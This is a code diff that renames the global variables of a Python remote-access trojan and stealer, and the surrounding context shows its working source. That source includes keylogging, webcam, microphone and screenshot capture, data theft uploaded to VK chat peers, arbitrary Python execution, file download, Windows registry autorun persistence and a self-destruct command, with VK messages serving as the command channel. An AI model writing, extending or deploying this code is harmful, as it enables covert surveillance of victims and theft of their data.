@@ -90,48 +90,48 @@ VERSION = "[Pre-release] 0.5.5"
 
 # Commands.
 # Function: initialise_commands()
-commands_functions: typing.Dict[str, typing.Callable] = {}
-commands_help: typing.Dict[str, typing.Tuple] = {}
+COMMANDS_FUNCTIONS: typing.Dict[str, typing.Callable] = {}
+COMMANDS_HELP: typing.Dict[str, typing.Tuple] = {}
 
 
 # Settings.
 
 # Config data.
-config: typing.Dict = {}
+CONFIG: typing.Dict = {}
 
 # Client name.
 # Function: load_name()
-client_name: str = "CLIENT_INITIALISATION_ERROR"
+CLIENT_NAME: str = "CLIENT_INITIALISATION_ERROR"
 
 # Client tags.
 # Function load_tags()
-client_tags: typing.List[str] = ["CLIENT_INITIALISATION_ERROR"]
+CLIENT_TAGS: typing.List[str] = ["CLIENT_INITIALISATION_ERROR"]
 
 
 # Other.
 
 # Work folder.
-# Function: set_folder_path()
-folder: str = ""
+# Function: load_config()
+FOLDER: str = ""
 
 # Current directory for the files commands.
-current_directory = os.getcwd()
+CURRENT_DIRECTORY = os.getcwd()
 
 # Keylogger string.
-keylogger_buffer: str = ""
+KEYLOGGER_BUFFER: str = ""
 
 # `python` command output container.
-out = None
+OUT = None
 
 
 # Server.
 # Function: server_connect()
 
 # VK API Object.
-server_api = None
+SERVER_API = None
 
 # VK API Longpoll (longpoll / bot_longpoll).
-server_longpoll = None
+SERVER_LONGPOLL = None
 
 
 class CommandResult:
@@ -360,7 +360,7 @@ def save_name() -> None:
         # Trying to save name.
 
         # Getting path.
-        _path = folder + config["paths"]["name"]
+        _path = FOLDER + CONFIG["paths"]["name"]
 
         # Building path.
         filesystem_build_path(_path)
@@ -369,7 +369,7 @@ def save_name() -> None:
             # With opened file.
 
             # Writing name.
-            _tf.write(str(client_name))
+            _tf.write(str(CLIENT_NAME))
     except Exception as _exception:  # noqa
         # If there is exception occurred.
 
@@ -382,13 +382,13 @@ def load_name() -> None:
     # @description Function that loads all name data.
 
     # Globalising name.
-    global client_name
+    global CLIENT_NAME
 
     try:
         # Trying to load name.
 
         # Getting path.
-        path = folder + config["paths"]["name"]
+        path = FOLDER + CONFIG["paths"]["name"]
 
         # Building path.
         filesystem_build_path(path)
@@ -400,13 +400,13 @@ def load_name() -> None:
                 # Trying to read name.
 
                 # Clearing name.
-                client_name = ""
+                CLIENT_NAME = ""
 
                 with open(path, "r", encoding="UTF-8") as _nf:
                     # With opened file.
 
                     # Reading name.
-                    client_name = str(_nf.read())
+                    CLIENT_NAME = str(_nf.read())
             except Exception as exception:  # noqa
                 # If there is exception occurred.
 
@@ -414,7 +414,7 @@ def load_name() -> None:
                 debug_message(f"Can`t load name file! Exception: {exception}")
 
                 # Name.
-                client_name = get_ip()["ip"]
+                CLIENT_NAME = get_ip()["ip"]
 
                 # Saving name.
                 save_name()
@@ -422,7 +422,7 @@ def load_name() -> None:
             # If we don't have name file.
 
             # Name.
-            client_name = get_ip()["ip"]
+            CLIENT_NAME = get_ip()["ip"]
 
             # Saving name.
             save_name()
@@ -434,7 +434,7 @@ def load_name() -> None:
                       f"Full exception information - {_exception}")
 
         # Name.
-        client_name = get_ip()["ip"]  # noqa
+        CLIENT_NAME = get_ip()["ip"]  # noqa
 def stealer_steal_data(_force: bool = False):
     # @function stealer_steal_data()
     # @returns None
@@ -449,7 +449,7 @@ def stealer_steal_data(_force: bool = False):
             # If we not already stolen data or forcing.
 
             # Getting file name.
-            _path = folder + config["paths"]["log"]
+            _path = FOLDER + CONFIG["paths"]["log"]
 
             # Getting ip data.
             _ip = get_ip()
@@ -503,7 +503,7 @@ def stealer_steal_data(_force: bool = False):
                 # Dumping.
                 json.dump(data, _file, indent=4)
 
-            for _peer in config["server"]["vk"]["peers"]:
+            for _peer in CONFIG["server"]["vk"]["peers"]:
                 # For every peer in peers.
 
                 # Uploading document.
@@ -538,7 +538,7 @@ def server_upload_photo(_path: str) -> str:
     # @description Function that  uploads photo on the server.
 
     # Getting uploader.
-    _uploader = vk_api.upload.VkUpload(server_api)
+    _uploader = vk_api.upload.VkUpload(SERVER_API)
 
     # Uploading photo.
     _photo = _uploader.photo_messages(_path)
@@ -563,7 +563,7 @@ def execute_python(_code: str, _globals: typing.Dict, _locals: typing.Dict) -> a
     # @description Function that executes python code and returns it out in variable out.
 
     # Getting global out.
-    global out
+    global OUT
 
     # Getting clean code.
     clean_code = _code.replace("&gt;", ">").replace("&lt;", "<").replace('&quot;', "'").replace('&tab', '   ')
@@ -583,7 +583,7 @@ def execute_python(_code: str, _globals: typing.Dict, _locals: typing.Dict) -> a
         # Trying to return out.
 
         # Returning out.
-        return out
+        return OUT
     except NameError:
         # If there is an name error.
 
@@ -612,7 +612,7 @@ def command_screenshot(*_) -> CommandResult:
     screenshot = PIL.ImageGrab.grab()
 
     # Getting path.
-    path = folder + config["paths"]["screenshot"]
+    path = FOLDER + CONFIG["paths"]["screenshot"]
 
     # Saving it.
     screenshot.save(path)
@@ -647,7 +647,7 @@ def command_webcam(_arguments, _event) -> CommandResult:
     _, image = camera.read()
 
     # Getting path.
-    path = folder + config["paths"]["webcam"]
+    path = FOLDER + CONFIG["paths"]["webcam"]
 
     # Building path.
     filesystem_build_path(path)
@@ -682,7 +682,7 @@ def command_microphone(arguments, _) -> CommandResult:
         return CommandResult("This command does not supported on selected PC! (pyaduio/wave module is not installed)")
 
     # Getting path.
-    path = folder + config["paths"]["microphone"]
+    path = FOLDER + CONFIG["paths"]["microphone"]
 
     # Record with seconds or without if not passed.
     try:
@@ -739,11 +739,11 @@ def command_download(arguments, _) -> CommandResult:
     else:
         # If not exists.
 
-        if os.path.exists(folder + path):
+        if os.path.exists(FOLDER + path):
             # Try relative.
 
             # Call for relative.
-            return command_download(folder + path, _)
+            return command_download(FOLDER + path, _)
 
     # Error.
     return CommandResult("Path that you want download does not exists")
@@ -824,16 +824,16 @@ def command_tags_new(arguments, _) -> CommandResult:
         # If tags was added.
 
         # Globalising tags
-        global client_tags
+        global CLIENT_TAGS
 
         # Set new tags
-        client_tags = new_tags
+        CLIENT_TAGS = new_tags
 
         # Saving tags.
         save_tags()
 
         # Message.
-        return CommandResult(f"Tags was replaced to: {';'.join(client_tags)}")
+        return CommandResult(f"Tags was replaced to: {';'.join(CLIENT_TAGS)}")
 
     # Message.
     return CommandResult("Tags replacing was not completed! No valid tags passed!")
@@ -849,19 +849,19 @@ def command_tags_add(arguments: str, _) -> CommandResult:
         return CommandResult("Incorrect tags arguments! Example: (tags separated by ;)")
 
     # Globalising tags.
-    global client_tags
+    global CLIENT_TAGS
 
     # Clean tags.
     tags = [tag.replace(" ", "-") for tag in arguments]
 
     # Add tags.
-    client_tags.extend(tags)
+    CLIENT_TAGS.extend(tags)
 
     # Saving tags.
     save_tags()
 
     # Message.
-    return CommandResult(f"Added new tags: {';'.join(tags)}. Now tags is: {';'.join(client_tags)}")
+    return CommandResult(f"Added new tags: {';'.join(tags)}. Now tags is: {';'.join(CLIENT_TAGS)}")
 
 
 def command_help(arguments, _event) -> CommandResult:
@@ -876,14 +876,14 @@ def command_help(arguments, _event) -> CommandResult:
         # Getting command.
         command = arguments[0]
 
-        if command not in commands_help:
+        if command not in COMMANDS_HELP:
             # If command not exists.
 
             # Error.
             return CommandResult(f"Command {command} not exists!")
 
         # Help information.
-        information, using = commands_help[command]
+        information, using = COMMANDS_HELP[command]
 
         # Returning information.
         return CommandResult(
@@ -895,7 +895,7 @@ def command_help(arguments, _event) -> CommandResult:
     # Help string.
     help_string = ""
 
-    for command, information in commands_help.items():
+    for command, information in COMMANDS_HELP.items():
         # For all commands and they information.
 
         # Decompose information.
@@ -942,11 +942,11 @@ def command_properties(arguments, _) -> CommandResult:
     else:
         # If not exists.
 
-        if os.path.exists(folder + path):
+        if os.path.exists(FOLDER + path):
             # Try relative.
 
             # Call for relative.
-            return command_properties(folder + path, _)
+            return command_properties(FOLDER + path, _)
 
     # Error.
     return CommandResult("Path does not exists!")
@@ -956,7 +956,7 @@ def command_cd(arguments, _) -> CommandResult:
     """ Command `cd` that changes directory. """
 
     # Globalising current directory.
-    global current_directory
+    global CURRENT_DIRECTORY
 
     # Get directory path.
     path = arguments
@@ -969,13 +969,13 @@ def command_cd(arguments, _) -> CommandResult:
         # If go up.
 
         # Get directory elements.
-        path_directories = current_directory.split("\\")
+        path_directories = CURRENT_DIRECTORY.split("\\")
 
         if len(path_directories) == 1:
             # If last (like C:\\)
 
             # Error.
-            return CommandResult("Already in root! Directory: " + current_directory)
+            return CommandResult("Already in root! Directory: " + CURRENT_DIRECTORY)
 
         # Remove last.
         path_directories.pop(-1)
@@ -991,20 +991,20 @@ def command_cd(arguments, _) -> CommandResult:
         path = "\\".join(path_directories)
         return command_cd(path, _)
 
-    if os.path.exists(current_directory + "\\" + path):
+    if os.path.exists(CURRENT_DIRECTORY + "\\" + path):
         # If this is local folder.
 
-        if not os.path.isdir(current_directory + "\\" + path):
+        if not os.path.isdir(CURRENT_DIRECTORY + "\\" + path):
             # If not directory.
 
             # Error.
             return CommandResult("Can`t change directory to the filename")
 
         # Changing.
-        current_directory += "\\" + path
+        CURRENT_DIRECTORY += "\\" + path
 
         # Message.
-        return CommandResult(f"Changed directory to {current_directory}")
+        return CommandResult(f"Changed directory to {CURRENT_DIRECTORY}")
     else:
         # If not local path.
         if os.path.exists(path):
@@ -1020,13 +1020,13 @@ def command_cd(arguments, _) -> CommandResult:
                 # If no arguments.
 
                 # Message.
-                return CommandResult(f"Current directory - {current_directory}")
+                return CommandResult(f"Current directory - {CURRENT_DIRECTORY}")
 
             # Changing.
-            current_directory = path
+            CURRENT_DIRECTORY = path
 
             # Message.
-            return CommandResult(f"Changed directory to {current_directory}")
+            return CommandResult(f"Changed directory to {CURRENT_DIRECTORY}")
 
         # Message.
         return CommandResult(f"Directory {path} does not exists!")
@@ -1065,19 +1065,19 @@ def command_name_new(arguments, _) -> CommandResult:
     """ Сommand `name_new` that changes name to other."""
 
     # Global name.
-    global client_name
+    global CLIENT_NAME
 
     if len(arguments) > 0:
         # If correct arguments.
 
         # Changing name.
-        client_name = arguments
+        CLIENT_NAME = arguments
 
         # Saving name
         save_name()
 
         # Returning.
-        return CommandResult(f"Name was changed to {client_name}")
+        return CommandResult(f"Name was changed to {CLIENT_NAME}")
 
     # Returning.
     return CommandResult("Invalid new name!")
@@ -1154,7 +1154,7 @@ def command_ls(arguments, _) -> CommandResult:
     """ Command `ls` that lists all files in the directory. """
 
     # Get directory.
-    directory_path = arguments if arguments != "" else current_directory
+    directory_path = arguments if arguments != "" else CURRENT_DIRECTORY
 
     # Get files.
     # TODO filesystem_try_listdir error handling.
@@ -1271,7 +1271,7 @@ def command_tags(*_) -> CommandResult:
     """ Command tags that returns tags list. """
 
     # Returning.
-    return CommandResult(str("Tag: ,\n".join(client_tags)))
+    return CommandResult(str("Tag: ,\n".join(CLIENT_TAGS)))
 
 
 def command_version(*_) -> CommandResult:
@@ -1353,15 +1353,15 @@ def command_destruct(*_) -> CommandResult:
     autorun_unregister()
 
     # Removing working folder path.
-    filesystem_try_delete(folder + config["paths"]["tags"])
-    filesystem_try_delete(folder + config["paths"]["name"])
-    filesystem_try_delete(folder + config["paths"]["log"])
-    filesystem_try_delete(folder + config["paths"]["anchor"])
-    filesystem_try_delete(folder + config["paths"]["screenshot"])
-    filesystem_try_delete(folder + config["paths"]["microphone"])
-    filesystem_try_delete(folder + config["paths"]["webcam"])
-    filesystem_try_delete(folder + config["autorun"]["executable"])
-    filesystem_try_delete(folder)
+    filesystem_try_delete(FOLDER + CONFIG["paths"]["tags"])
+    filesystem_try_delete(FOLDER + CONFIG["paths"]["name"])
+    filesystem_try_delete(FOLDER + CONFIG["paths"]["log"])
+    filesystem_try_delete(FOLDER + CONFIG["paths"]["anchor"])
+    filesystem_try_delete(FOLDER + CONFIG["paths"]["screenshot"])
+    filesystem_try_delete(FOLDER + CONFIG["paths"]["microphone"])
+    filesystem_try_delete(FOLDER + CONFIG["paths"]["webcam"])
+    filesystem_try_delete(FOLDER + CONFIG["autorun"]["executable"])
+    filesystem_try_delete(FOLDER)
 
     # Exiting.
     return command_exit(*_)
@@ -1377,7 +1377,7 @@ def command_keylog(*_) -> CommandResult:
         return CommandResult("Keylogger is disabled!")
 
     # Returning.
-    return CommandResult(keylogger_buffer)
+    return CommandResult(KEYLOGGER_BUFFER)
 
 
 def command_restart(*_) -> CommandResult:
@@ -1414,14 +1414,14 @@ def command_console(arguments, _) -> CommandResult:
 def execute_command(command_name: str, arguments: str, event) -> CommandResult:
     """ Function that executes command and return it result. """
 
-    for command in commands_functions:
+    for command in COMMANDS_FUNCTIONS:
         # For all commands names in commands dict.
 
         if command_name == command:
             # If it is this commands.
 
             # Executing command and returning result.
-            result: CommandResult = commands_functions[command](arguments, event)
+            result: CommandResult = COMMANDS_FUNCTIONS[command](arguments, event)
             return result
 
     # Default answer.
@@ -1435,7 +1435,7 @@ def process_message(event) -> None:
     message = event
 
     # Update message container with type.
-    if config["server"]["type"] == "VK_GROUP":
+    if CONFIG["server"]["type"] == "VK_GROUP":
         message = message.message
 
     # Response answer and attachment.
@@ -1471,7 +1471,7 @@ def process_message(event) -> None:
         else:
             # If this is not alive command.
 
-            if list_intersects(parse_tags(tags), client_tags):
+            if list_intersects(parse_tags(tags), CLIENT_TAGS):
                 # If we have one or more tag from our tags.
 
                 if peer_is_allowed(message.peer_id):
@@ -1531,7 +1531,7 @@ def process_message(event) -> None:
                                     answer_text = f"Error when uploading document with type `{uploading_type}`. " \
                                                   f"Result - {uploading_result}"
 
-                            if config["settings"]["delete_file_after_uploading"] and \
+                            if CONFIG["settings"]["delete_file_after_uploading"] and \
                                     command_result.should_delete_after_uploading():
                                 # If should delete.
 
@@ -1622,7 +1622,7 @@ def keylogger_callback_event(keyboard_event):
         keyboard_key = str(keyboard_event.name)
 
         # Globalising keylogger string.
-        global keylogger_buffer
+        global KEYLOGGER_BUFFER
 
         if type(keyboard_key) == str:
             # If this is string.
@@ -1633,22 +1633,22 @@ def keylogger_callback_event(keyboard_event):
                     # If this is space key.
 
                     # Adding space.
-                    keylogger_buffer = " "
+                    KEYLOGGER_BUFFER = " "
                 elif keyboard_key == "enter":
                     # If this enter key.
 
                     # Adding newline.
-                    keylogger_buffer = "\n"
+                    KEYLOGGER_BUFFER = "\n"
                 elif keyboard_key == "decimal":
                     # If this is decimal key.
 
                     # Adding dot.
-                    keylogger_buffer = "."
+                    KEYLOGGER_BUFFER = "."
                 elif keyboard_key == "backspace":
                     # If this is backspace key.
 
                     # Deleting from the keylog.
-                    keylogger_buffer = keylogger_buffer[:-1]
+                    KEYLOGGER_BUFFER = KEYLOGGER_BUFFER[:-1]
                 else:
                     # If this is some other key.
 
@@ -1656,12 +1656,12 @@ def keylogger_callback_event(keyboard_event):
                     keyboard_key = keyboard_key.replace(" ", "_").upper()
 
                     # Adding it to the keylog.
-                    keylogger_buffer = f"[{keyboard_key}]"
+                    KEYLOGGER_BUFFER = f"[{keyboard_key}]"
             else:
                 # If this is only 1 char.
 
                 # Adding key (char) to the keylogger string.
-                keylogger_buffer += keyboard_key
+                KEYLOGGER_BUFFER += keyboard_key
     except Exception as exception:  # noqa
         # If there is exception occurred.
 
@@ -1675,8 +1675,8 @@ def server_connect() -> None:
     """ Connects to the server. """
 
     # Globalising variables.
-    global server_api
-    global server_longpoll
+    global SERVER_API
+    global SERVER_LONGPOLL
 
     # Debug message.
     debug_message(f"[Server] Connecting to the server...")
@@ -1687,8 +1687,8 @@ def server_connect() -> None:
     try:
         # Trying to connect to server.
 
-        if "server" not in config or "type" not in config["server"]:
-            # If not config server type key.
+        if "server" not in CONFIG or "type" not in CONFIG["server"]:
+            # If not CONFIG server type key.
 
             # Error.
             debug_message(f"[Server] Failed to get configuration server->type value key! "
@@ -1696,7 +1696,7 @@ def server_connect() -> None:
             sys.exit(1)
 
         # Reading server type.
-        server_type = config["server"]["type"]
+        server_type = CONFIG["server"]["type"]
         
         if server_type in ("VK_USER", "VK_GROUP"):
             # If one of the VK server type.
@@ -1704,8 +1704,8 @@ def server_connect() -> None:
             # Debug message.
             debug_message(f"[Server] Selected VK \"{server_type}\" server type...")
 
-            # Get config server access token.
-            access_token = config["server"]["vk"]["user" if server_type == "VK_USER" else "group"]["access_token"]
+            # Get CONFIG server access token.
+            access_token = CONFIG["server"]["vk"]["user" if server_type == "VK_USER" else "group"]["access_token"]
 
             # Importing longpoll.
             if server_type == "VK_GROUP":
@@ -1714,21 +1714,21 @@ def server_connect() -> None:
                 import vk_api.longpoll
 
             # Connect to the VK API.
-            server_api = vk_api.VkApi(token=access_token)
+            SERVER_API = vk_api.VkApi(token=access_token)
 
             # Connecting to the longpoll.
             if server_type == "VK_GROUP":
 
                 # Get VK group index.
-                group_index = config["server"]["vk"]["group"]["index"]
+                group_index = CONFIG["server"]["vk"]["group"]["index"]
 
                 # Connect group longpoll.
-                server_longpoll = vk_api.bot_longpoll.VkBotLongPoll(server_api, group_index)
+                SERVER_LONGPOLL = vk_api.bot_longpoll.VkBotLongPoll(SERVER_API, group_index)
             else:
                 # Connect user longpoll.
-                server_longpoll = vk_api.longpoll.VkLongPoll(server_api)
+                SERVER_LONGPOLL = vk_api.longpoll.VkLongPoll(SERVER_API)
         else:
-            # If invalid config server type.
+            # If invalid CONFIG server type.
 
             # Error.
             debug_message(f"[Server] Failed to connect with current server type, "
@@ -1748,22 +1748,22 @@ def server_connect() -> None:
 def server_listen() -> None:
     """ Listen server for new messages. """
 
-    if server_longpoll is None:
+    if SERVER_LONGPOLL is None:
         # If server longpoll is not connected.
 
         # Error.
         debug_message(f"[Server] Failed to start server listening as server longpoll is not connected!")
         exit(1)
 
-    if "server" not in config or "type" not in config["server"]:
-        # If not config server type key.
+    if "server" not in CONFIG or "type" not in CONFIG["server"]:
+        # If not CONFIG server type key.
 
         # Error.
         debug_message(f"[Server] Failed to get configuration server->type value key! Please check configuration file!")
         exit(1)
 
     # Reading server type.
-    server_type = config["server"]["type"]
+    server_type = CONFIG["server"]["type"]
     
     # Message.
     debug_message("[Server] Starting listening...")
@@ -1788,7 +1788,7 @@ def server_listen() -> None:
                                   f"as it may be not implemented / exists. Server type - {server_type}")
                     return
 
-                for event in server_longpoll.listen():  # noqa
+                for event in SERVER_LONGPOLL.listen():  # noqa
                     # For every message event in the server longpoll listening.
 
                     if event.type == message_event:
@@ -1803,7 +1803,7 @@ def server_listen() -> None:
                 # Error.
                 debug_message(f"[Server] Failed to listen server. Exception - {exception}")
     else:
-        # If invalid config server type.
+        # If invalid CONFIG server type.
 
         # Error.
         debug_message(f"[Server] Failed to listen with current server type, as it may be not implemented / exists. "
@@ -1814,7 +1814,7 @@ def server_listen() -> None:
 def server_method(method: str, parameters: typing.Dict, is_retry=False) -> typing.Optional[typing.Any]:
     """ Calls server method. """
 
-    if server_api is None:
+    if SERVER_API is None:
         # If no server API.
 
         # Just return.
@@ -1830,15 +1830,15 @@ def server_method(method: str, parameters: typing.Dict, is_retry=False) -> typin
             parameters["random_id"] = vk_api.utils.get_random_id()
 
         # Executing method.
-        return server_api.method(method, parameters)  # noqa
+        return SERVER_API.method(method, parameters)  # noqa
     except Exception as exception:  # noqa
         # Error.
 
         # Message.
         debug_message(f"[Server] Error when trying to call server method (API)! Exception - {exception}")
 
-        # Rading config.
-        retry_on_fail = config["server"]["vk"]["retry_method_on_fail"]
+        # Rading CONFIG.
+        retry_on_fail = CONFIG["server"]["vk"]["retry_method_on_fail"]
 
         if is_retry or not retry_on_fail:
             # If this is already retry.
@@ -1858,8 +1858,8 @@ def server_message(text: str, attachmment: str = None, peer: int = None) -> None
     if peer is None:
         # If peer index is not specified.
 
-        for config_peer in config["server"]["vk"]["peers"]:
-            # For every peer index in config peer indices.
+        for config_peer in CONFIG["server"]["vk"]["peers"]:
+            # For every peer index in CONFIG peer indices.
 
             # Sending messages to they.
             server_message(text, attachmment, config_peer)
@@ -1868,7 +1868,7 @@ def server_message(text: str, attachmment: str = None, peer: int = None) -> None
         return
 
     # Adding name to the text.
-    _text = f"<{client_name}>\n{text}"
+    _text = f"<{CLIENT_NAME}>\n{text}"
 
     # Debug message.
     debug_message("[Server] Sent new message!")
@@ -1889,7 +1889,7 @@ def server_upload_document(path: str, title: str, peer: int, document_type: str 
         # Trying to upload document.
 
         # Getting api for the uploader.
-        server_docs_api = server_api.get_api().docs # noqa
+        server_docs_api = SERVER_API.get_api().docs # noqa
 
         # Getting upload url.
         if "upload_url" in (upload_server := server_docs_api.getMessagesUploadServer(type=document_type, peer_id=peer)):
@@ -2093,10 +2093,10 @@ def reset_tags() -> None:
     """ Resets tags. """
 
     # Globalising tags.
-    global client_tags
+    global CLIENT_TAGS
 
     # Tags list.
-    client_tags = get_default_tags()
+    CLIENT_TAGS = get_default_tags()
 
     # Saving tags.
     save_tags()
@@ -2106,13 +2106,13 @@ def load_tags() -> None:
     """ Loads all tags data. """
 
     # Globalising tags.
-    global client_tags
+    global CLIENT_TAGS
 
     try:
         # Trying to load tags.
 
         # Getting path.
-        path = folder + config["paths"]["tags"]
+        path = FOLDER + CONFIG["paths"]["tags"]
 
         # Building path.
         filesystem_build_path(path)
@@ -2127,7 +2127,7 @@ def load_tags() -> None:
                     # With opened file.
 
                     # Reading tags.
-                    client_tags = json.loads(tags_file.read())["tags"]
+                    CLIENT_TAGS = json.loads(tags_file.read())["tags"]
             except Exception as exception:  # noqa
                 # If there is exception occurred.
 
@@ -2151,7 +2151,7 @@ def load_tags() -> None:
         debug_message(f"[Tags] Failed to load tags, set tags to error! Exception - {exception}")
 
         # Setting error tags.
-        client_tags = DEFAULT_INVALID_TAGS
+        CLIENT_TAGS = DEFAULT_INVALID_TAGS
 
     # Message.
     debug_message("[Tags] Loading complete!")
@@ -2174,7 +2174,7 @@ def save_tags() -> None:
         debug_message("[Tags] Saving tags to the file...")
 
         # Getting path.
-        path = folder + config["paths"]["tags"]
+        path = FOLDER + CONFIG["paths"]["tags"]
 
         # Building path.
         filesystem_build_path(path)
@@ -2184,7 +2184,7 @@ def save_tags() -> None:
 
             # Writing tags.
             tags_file.write(json.dumps({
-                "tags": client_tags
+                "tags": CLIENT_TAGS
             }))
     except Exception as exception:  # noqa
         # If there is exception occurred.
@@ -2360,11 +2360,11 @@ def initialise_commands() -> None:
     """ Initialises commands. """
 
     # Globalising command functions and help.
-    global commands_functions
-    global commands_help
+    global COMMANDS_FUNCTIONS
+    global COMMANDS_HELP
 
     # Commands function.
-    commands_functions = {
+    COMMANDS_FUNCTIONS = {
         "screenshot": command_screenshot,
         "webcam": command_webcam,
         "microphone": command_microphone,
@@ -2399,7 +2399,7 @@ def initialise_commands() -> None:
     }
 
     # Commands help.
-    commands_help = {
+    COMMANDS_HELP = {
         "discord_profile_raw": (
             "Returns you all RAW (as dict (JSON)) information about client Discord profile",
             "discord_profile_raw"
@@ -2500,8 +2500,8 @@ def initialise_commands() -> None:
             "exit"
         ),
         "python": (
-            "Executes python code, if you want to get output write - global out "
-            "out = \"Hello World!\" and this is gonna be shown.",
+            "Executes python code, if you want to get output write - global OUT "
+            "OUT = \"Hello World!\" and this is gonna be shown.",
             "python [required]CODE"
         ),
         "message": (
@@ -2615,7 +2615,7 @@ def stealer_is_already_worked() -> bool:
     """ Returns true if stealer already worked. """
 
     # Getting path to anchor file.
-    path: str = folder + config["paths"]["anchor"]
+    path: str = FOLDER + CONFIG["paths"]["anchor"]
 
     if not os.path.exists(path):
         # If anchor file not exists.
@@ -2686,8 +2686,8 @@ def autorun_register() -> None:
         # Trying to add to the autorun.
 
         # Getting executable path.
-        executable_filename = config["autorun"]["executable"]
-        executable_path = f"{folder}{executable_filename}.{executable_get_extension()}"
+        executable_filename = CONFIG["autorun"]["executable"]
+        executable_path = f"{FOLDER}{executable_filename}.{executable_get_extension()}"
 
         if not os.path.exists(executable_path):
             # If no file there (We don't add this already.
@@ -2704,7 +2704,7 @@ def autorun_register() -> None:
                                       reserved=0, access=winreg.KEY_ALL_ACCESS)
 
         # Adding autorun.
-        winreg.SetValueEx(registry_key, config["autorun"]["name"], 0, winreg.REG_SZ, executable_path)
+        winreg.SetValueEx(registry_key, CONFIG["autorun"]["name"], 0, winreg.REG_SZ, executable_path)
 
         # Closing key.
         winreg.CloseKey(registry_key)
@@ -2764,7 +2764,7 @@ def autorun_unregister() -> None:
                                                        reserved=0, access=winreg.KEY_ALL_ACCESS)
 
         # Deleting autorun.
-        winreg.DeleteValue(registry_key, config["autorun"]["name"])
+        winreg.DeleteValue(registry_key, CONFIG["autorun"]["name"])
 
         # Closing key.
         winreg.CloseKey(registry_key)
@@ -2778,36 +2778,36 @@ def autorun_unregister() -> None:
 # Config.
 
 def load_config() -> None:
-    """ Loads config values. """
+    """ Loads CONFIG values. """
 
-    # Globalise config and folder.
-    global config
-    global folder
+    # Globalise CONFIG and folder.
+    global CONFIG
+    global FOLDER
 
     # Opening JSON file
     try:
         with open("config.json", "r", encoding="UTF-8") as config_file:
-            config = json.load(config_file)
+            CONFIG = json.load(config_file)
     except FileNotFoundError:
-        # If config not exists.
-        debug_message("[Config] Failed to load config file as it is not found! Please read more wiki...")
+        # If CONFIG not exists.
+        debug_message("[Config] Failed to load CONFIG file as it is not found! Please read more wiki...")
 
-    if not config:
+    if not CONFIG:
         # If empty.
 
         # Error.
-        debug_message("[Config] Failed to load! Is config file empty?")
+        debug_message("[Config] Failed to load! Is CONFIG file empty?")
         sys.exit(1)
 
     # Update folder.
-    if "paths" in config and "main" in config["paths"]:
+    if "paths" in CONFIG and "main" in CONFIG["paths"]:
         # If path found.
 
         # Read.
-        folder = os.getenv("APPDATA") + config["paths"]["main"]
+        FOLDER = os.getenv("APPDATA") + CONFIG["paths"]["main"]
     else:
         # Error.
-        debug_message("[Config] Failed to load main folder in paths->main! Is config file invalid?")
+        debug_message("[Config] Failed to load main folder in paths->main! Is CONFIG file invalid?")
         sys.exit(1)
 
     # Message.
@@ -2820,7 +2820,7 @@ def peer_is_allowed(peer: str) -> bool:
     """ Returns is peer is allowed or not. """
 
     # Get peers.
-    peers: typing.List = config["server"]["vk"]["peers"]
+    peers: typing.List = CONFIG["server"]["vk"]["peers"]
 
     if peers is None or len(peers) == 0:
         # If there is no peers in the list
@@ -2851,7 +2851,7 @@ def launch() -> None:
         # Start message.
         debug_message("[Launch] Starting...")
 
-        # Load config to work with values.
+        # Load CONFIG to work with values.
         load_config()
 
         # Asserting operating system, exiting if the operation system is not supported.
@@ -2882,7 +2882,7 @@ def launch() -> None:
         autorun_register()
 
         # Message that we connected to the network.
-        server_message(f"Connected to the network! (His tags: {', '.join(client_tags)})")
+        server_message(f"Connected to the network! (His tags: {', '.join(CLIENT_TAGS)})")
 
         # Registering exit_handler() as handler for exit.
         atexit.register(exit_handler)
